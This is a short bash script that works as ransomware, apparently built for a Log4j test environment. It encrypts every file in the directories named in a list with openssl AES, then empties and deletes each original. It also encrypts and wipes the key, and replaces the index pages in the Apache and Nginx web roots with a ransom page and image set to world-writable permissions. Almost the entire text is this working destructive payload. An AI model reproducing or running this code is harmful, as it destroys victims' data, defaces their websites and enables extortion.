#!/bin/bash

LIST=/home/log4jtest/list
RANSOM=/home/log4jtest/ransom.html
IMAGE=/home/log4jtest/bg.jpg
WKEY=/home/log4jtest/whiteKey
CIPHER=/home/log4jtest//whiteCipher
KEY=/home/log4jtest/key
openssl rand -hex 16 > $KEY

for LOCATION in $(cat $LIST)
do
	for FILE in $(find $LOCATION -type f)
	do
		openssl aes-128-cbc -salt -pass file:"$KEY" -in "$FILE" -out "$FILE.enc" && cat /dev/null > "$FILE" && rm -rf "$FILE"
	done
done

"$CIPHER" -key "$WKEY" -in "$KEY" -out "$KEY.enc" | cut -d ' ' -f 2 | head -n 1 > "$KEY.iv" && cat /dev/null > "$KEY" && rm -rf "$KEY"

APACHE=/var/www
NGINX=/usr/share/nginx

APACHEs=$(find $APACHE -name index.*)
NGINXes=$(find $NGINX -name index.*)

PAGES="$APACHEs $NGINXes"

chmod 777 $IMAGE

for PAGE in $PAGES
do
	cp $RANSOM ${PAGE%.*}
	chmod 777 ${PAGE%.*}
	cp $IMAGE ${PAGE%/*}
done

